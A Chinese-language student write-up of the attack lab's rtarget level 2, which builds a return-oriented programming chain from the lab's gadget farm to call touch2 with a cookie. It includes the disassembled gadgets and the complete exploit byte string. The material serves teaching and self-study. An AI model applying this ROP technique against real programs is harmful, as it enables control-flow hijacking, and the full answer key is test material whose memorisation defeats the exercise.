### 思路

- **level2简介**
  任务依旧是call:touch2()，且传递参数cookie，但是不能用自己的注入代码，只能用farm中的有的机器级指令.

- **解题过程**
  cookie的表示可以通过溢出的字符串注入，而我们利用ret返回到farm中有目标汇编指令的地址中，等价于不用call指令，却实现了调用我们想要的函数功能，而%rsp不会因为call指令而变，那么就为我们的攻击代码提供了可能性.  

  而在ctarget的level2中，我们的注入代码如下.

  ```py
    movq    $0x59b997fa,%rdi
    pushq   $0x4017ec
    ret     # ret指令等价于pop %rip 

    # 显然我们无法在farm中找到包含某个特定立即数(cookie)对应的指令，如果有，就不会出题了，优化

    # (参考了网上的solution)希望这样
    pop %rdi
    ret
  ```

  但是优化后的指令依旧没有对应的机器码，继续优化.

  ```py
    pop %rax
    ret
    --------------
    movq %rax,%rdi
    ret


    0000000000000000 <.text>:
   0:	5e                   	pop    %rsi
   1:	c3                   	ret    
   2:	58                   	pop    %rax
   3:	c3                   	ret    
   4:	48 89 c7             	mov    %rax,%rdi
   7:	c3                   	ret    
  ```

  我们发现上面的指令有对应的机器码

  ```py
  00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    
  -----------
  00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    

  90 对应 'nop'指令，所以不影响指令的执行，那么我们提取出两个地址
  1. 0x4019ab
  2. 0x4019c5
  ```
- 最终答案
  
  ```py
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    ab 19 40 00 00 00 00 00 # 注意一次pop为8个字节，第一个gadget地址
    fa 97 b9 59 00 00 00 00 # cookie pop 到 %rax
    c5 19 40 00 00 00 00 00 # 第二个gadget地址
    ec 17 40 00 00 00 00 00 # ret，即pop touch2地址 到 %rip
  ```